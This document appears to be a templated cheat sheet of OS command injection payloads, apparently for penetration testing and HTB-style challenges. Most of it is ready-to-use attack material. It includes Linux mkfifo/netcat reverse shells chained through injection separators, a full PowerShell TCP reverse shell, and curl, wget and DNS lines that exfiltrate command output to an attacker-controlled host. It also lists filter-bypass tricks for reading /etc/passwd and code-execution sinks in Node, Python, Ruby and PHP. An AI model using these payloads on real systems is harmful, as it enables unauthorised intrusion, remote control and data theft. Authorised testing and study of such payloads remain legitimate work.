# Command Injection

> OS command injection payloads — separators, blind, filter bypass, language-specific

<!-- tags: cmdi, rce, web, payload, exploit, injection -->

---

## CMDi - Basic Separators
Common command chaining operators.

```bash
echo "; id"
echo "&& id"
echo "| id"
echo "|| id"
echo "%0a id"
echo "\$(id)"
echo "\`id\`"
```

<!-- meta: risk=med | phase=exploit | tags=cmdi,basic -->

---

## CMDi - Reverse Shell via &&
Chain after a known-good IP/hostname.

```bash
echo "8.8.8.8 && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {{LHOST:ip}} {{LPORT:port:9001}} >/tmp/f"
```

<!-- meta: risk=critical | phase=exploit | tags=cmdi,revshell -->

---

## CMDi - Reverse Shell via ;
Statement-terminator chain.

```bash
echo "8.8.8.8 ; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {{LHOST:ip}} {{LPORT:port:9001}} >/tmp/f"
```

<!-- meta: risk=critical | phase=exploit | tags=cmdi,revshell -->

---

## CMDi - Reverse Shell via ||
Run on failure (when first cmd errors).

```bash
echo "8.8.8.8 || rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {{LHOST:ip}} {{LPORT:port:9001}} >/tmp/f"
```

<!-- meta: risk=critical | phase=exploit | tags=cmdi,revshell -->

---

## CMDi - URL Encoded
Encode separators when web filter blocks them.

```bash
echo "8.8.8.8%20%26%26%20id"
```

<!-- meta: risk=med | phase=exploit | tags=cmdi,encoding -->

---

## CMDi - Blind via Time Delay
Confirm CMDi when output is suppressed.

```bash
echo "; sleep 5"
echo "& ping -c 5 127.0.0.1"
```

<!-- meta: risk=safe | phase=vuln | tags=cmdi,blind,time -->

---

## CMDi - Blind via DNS Exfil
Exfil data via DNS lookup callback.

```bash
echo "; nslookup \$(whoami).{{ATTACKER_DOMAIN:domain:attacker.com}}"
echo "; \$(whoami).{{ATTACKER_DOMAIN:domain:attacker.com}}"
```

<!-- meta: risk=med | phase=exploit | tags=cmdi,blind,dns,exfil -->

---

## CMDi - Bypass Space Filter
When spaces are blocked use IFS, ${IFS}, tab, or brace.

```bash
echo "{cat,/etc/passwd}"
echo "cat\${IFS}/etc/passwd"
echo "cat\$IFS\$9/etc/passwd"
```

<!-- meta: risk=med | phase=exploit | tags=cmdi,bypass,space -->

---

## CMDi - Bypass Slash Filter
Use $PATH or wildcards to construct paths.

```bash
echo "cat\${PATH:0:1}etc\${PATH:0:1}passwd"
```

<!-- meta: risk=med | phase=exploit | tags=cmdi,bypass,slash -->

---

## CMDi - Bypass Keyword Filter
Split keywords to bypass blacklists.

```bash
echo "ca''t /etc/passwd"
echo "c\\at /etc/passwd"
echo "/usr/bin/cat /etc/passwd"
echo "wh''oami"
```

<!-- meta: risk=med | phase=exploit | tags=cmdi,bypass,keyword -->

---

## CMDi - Read File Contents
Extract any readable file via injection.

```bash
echo "; cat /etc/passwd"
echo "; cat \$(find / -name flag.txt 2>/dev/null)"
```

<!-- meta: risk=med | phase=exploit | tags=cmdi,fileread -->

---

## CMDi - Curl Out-of-Band
Send command output to attacker.

```bash
echo "; curl http://{{LHOST:ip}}:{{LPORT:port:8000}}/?d=\$(id|base64)"
```

<!-- meta: risk=med | phase=exploit | tags=cmdi,oob,exfil -->

---

## CMDi - Wget OOB
Same idea via wget.

```bash
echo "; wget http://{{LHOST:ip}}:{{LPORT:port:8000}}/?d=\$(whoami)"
```

<!-- meta: risk=med | phase=exploit | tags=cmdi,oob,exfil -->

---

## CMDi - Windows Reverse Shell
PowerShell reverse shell payload.

```bash
echo "& powershell -nop -c \"\$client=New-Object System.Net.Sockets.TCPClient('{{LHOST:ip}}',{{LPORT:port:9001}});\$stream=\$client.GetStream();[byte[]]\$bytes=0..65535|%{0};while((\$i=\$stream.Read(\$bytes,0,\$bytes.Length)) -ne 0){;\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i);\$sendback=(iex \$data 2>&1 | Out-String);\$sendback2=\$sendback+'PS '+(pwd).Path+'> ';\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
```

<!-- meta: risk=critical | phase=exploit | tags=cmdi,windows,revshell -->

---

## CMDi - Windows Base64 PowerShell
Encoded PowerShell to evade quoting issues.

```bash
echo "{{LHOST:ip}}" | iconv -f utf-8 -t utf-16le | base64 -w0
echo "& powershell -e {{B64:str:JABjAGwAaQBlAG4AdAAg...}}"
```

<!-- meta: risk=critical | phase=exploit | tags=cmdi,windows,powershell -->

---

## CMDi - Windows: Multiple Separators
Windows-specific separators.

```bash
echo "& whoami"
echo "&& whoami"
echo "| whoami"
echo "|| whoami"
echo "%0a whoami"
```

<!-- meta: risk=med | phase=exploit | tags=cmdi,windows,basic -->

---

## CMDi - Argument Injection (no separator)
Abuse arg parsing when separators filtered.

```bash
echo "-oProxyCommand=bash"
echo "--checkpoint-action=shell_run='id'"
```

<!-- meta: risk=med | phase=exploit | tags=cmdi,argi,bypass -->

---

## CMDi - Curl URL with Embedded Cmd
Useful for HTB-style RCE chains.

```bash
curl -s "{{URL:url:http://target.htb/api?cmd=}}\$(id)"
curl -s "{{URL:url:http://target.htb/files/s.php?c=}}bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/{{LHOST:ip}}/{{LPORT:port:9001}}%200%3E%261%27"
```

<!-- meta: risk=critical | phase=exploit | tags=cmdi,curl,revshell -->

---

## CMDi - Node.js Backtick / Template Literal
Trigger Node template literal sink.

```bash
echo "\${require('child_process').execSync('id')}"
```

<!-- meta: risk=critical | phase=exploit | tags=cmdi,node,rce -->

---

## CMDi - Python Sink
String reaches eval/run sink.

```bash
echo "__import__('os').system('id')"
```

<!-- meta: risk=critical | phase=exploit | tags=cmdi,python,rce -->

---

## CMDi - Ruby Backtick
Ruby backtick command run.

```bash
echo "\`id\`"
echo "system('id')"
```

<!-- meta: risk=critical | phase=exploit | tags=cmdi,ruby,rce -->

---

## CMDi - PHP Sink
PHP system / passthru / shell_exec sinks.

```bash
echo "system('{{CMD:str:id}}');"
echo "passthru('{{CMD:str:id}}');"
echo "shell_exec('{{CMD:str:id}}');"
echo "\`id\`"
```

<!-- meta: risk=critical | phase=exploit | tags=cmdi,php,rce -->
